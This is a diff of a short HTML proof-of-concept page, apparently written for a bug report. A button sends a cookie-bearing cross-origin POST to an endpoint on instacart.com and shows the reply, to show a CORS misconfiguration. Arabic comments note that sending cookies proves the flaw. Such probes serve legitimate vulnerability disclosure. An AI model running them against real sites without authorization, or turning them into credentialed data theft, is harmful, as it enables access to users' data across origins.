@@ -1,39 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS POC</title>
+  <title>CORS Misconfiguration POC</title>
 </head>
 <body>
-    <h1>CORS Vulnerability Proof of Concept</h1>
-    <button id="testBtn">Test CORS</button>
-    <pre id="output"></pre>
+  <h1>CORS Misconfiguration POC</h1>
+  <p>اضغط على الزر عشان تبعت طلب POST لـ instacart.com وتعرض الرد.</p>
+  <button id="sendBtn">Send POST Request</button>
+  <pre id="output" style="background:#eee; padding:10px; border:1px solid #ccc;"></pre>
 
-    <script>
-        document.getElementById('testBtn').onclick = function() {
-            fetch('https://www.instacart.com/cdn-cgi/rum?', {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    test: "POC test"
-                })
-            })
-            .then(response => {
-                if(response.ok) {
-                    return response.text();
-                } else {
-                    throw new Error('Request failed');
-                }
-            })
-            .then(data => {
-                document.getElementById('output').innerText = 'Response: ' + data;
-            })
-            .catch(err => {
-                document.getElementById('output').innerText = 'Error: ' + err.message;
-            });
-        };
-    </script>
+  <script>
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      fetch('https://www.instacart.com/cdn-cgi/rum?', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ test: 'POC test' }),
+        credentials: 'include'  // مهم عشان تبعت الكوكيز وتثبت الثغرة
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById('output').textContent = 'Response from server:\n' + data;
+      })
+      .catch(error => {
+        document.getElementById('output').textContent = 'Error:\n' + error;
+      });
+    });
+  </script>
 </body>
 </html>
